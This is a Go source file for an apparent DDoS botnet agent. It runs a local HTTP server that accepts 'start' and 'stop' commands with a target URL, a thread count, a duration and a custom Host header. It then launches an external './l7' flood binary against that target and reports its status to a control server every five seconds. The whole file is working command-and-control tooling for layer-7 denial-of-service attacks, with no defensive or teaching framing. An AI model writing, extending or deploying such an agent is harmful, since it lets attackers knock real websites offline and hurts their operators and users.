package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"sync"
	"time"
)

// Command defines the JSON payload structure
type Command struct {
	Action     string `json:"action"`      // "start" or "stop"
	URL        string `json:"url"`         // Target URL
	Threads    int    `json:"threads"`     // Number of threads
	Timer      int    `json:"timer"`       // Duration in seconds
	CustomHost string `json:"custom_host"` // Optional custom Host header
}

var (
	currentCommand *exec.Cmd
	mu             sync.Mutex
	status         = "Ready"
)

func executeL7(url string, threads, timer int, customHost string) {
	// Lock to prevent multiple instances
	mu.Lock()
	defer mu.Unlock()

	// Stop any running command
	if currentCommand != nil && currentCommand.Process != nil {
		currentCommand.Process.Kill()
		currentCommand = nil
	}

	status = "Sending"

	// Build the L7 command with optional customHost
	args := []string{url, fmt.Sprintf("%d", threads), fmt.Sprintf("%d", timer)}
	if customHost != "" {
		args = append(args, customHost)
	}

	cmd := exec.Command("./l7", args...)

	// Set up command output (optional)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	// Start the L7 process
	if err := cmd.Start(); err != nil {
		fmt.Printf("Failed to start L7: %v\n", err)
		status = "Error"
		return
	}

	currentCommand = cmd

	// Stop the L7 process when the timer ends
	go func() {
		time.Sleep(time.Duration(timer) * time.Second)
		mu.Lock()
		if currentCommand != nil && currentCommand.Process != nil {
			currentCommand.Process.Kill()
			currentCommand = nil
		}
		status = "Ready"
		mu.Unlock()
	}()
}

func handleControl(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Invalid method", http.StatusMethodNotAllowed)
		return
	}

	var cmd Command
	if err := json.NewDecoder(r.Body).Decode(&cmd); err != nil {
		http.Error(w, "Invalid command format", http.StatusBadRequest)
		return
	}

	// Handle the command
	if cmd.Action == "start" {
		go executeL7(cmd.URL, cmd.Threads, cmd.Timer, cmd.CustomHost)
	} else if cmd.Action == "stop" {
		mu.Lock()
		if currentCommand != nil && currentCommand.Process != nil {
			currentCommand.Process.Kill()
			currentCommand = nil
		}
		status = "Ready"
		mu.Unlock()
	}

	w.WriteHeader(http.StatusOK)
}

func handleStatus(w http.ResponseWriter, r *http.Request) {
	mu.Lock()
	defer mu.Unlock()

	resp := map[string]string{
		"status": status,
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func pingControlServer(serverURL string) {
	for {
		mu.Lock()
		data := map[string]string{
			"status": status,
		}
		body, _ := json.Marshal(data)
		mu.Unlock()

		_, err := http.Post(serverURL+"/agent-status", "application/json", bytes.NewBuffer(body))
		if err != nil {
			fmt.Printf("Failed to ping control server: %v\n", err)
		}

		time.Sleep(5 * time.Second)
	}
}

func main() {
	controlServer := "http://localhost:8080" // Replace with your control server URL

	// Start pinging the control server
	go pingControlServer(controlServer)

	// Set up routes
	http.HandleFunc("/control", handleControl)
	http.HandleFunc("/status", handleStatus)

	fmt.Println("Agent running on http://localhost:8081")
	http.ListenAndServe(":8081", nil)
}
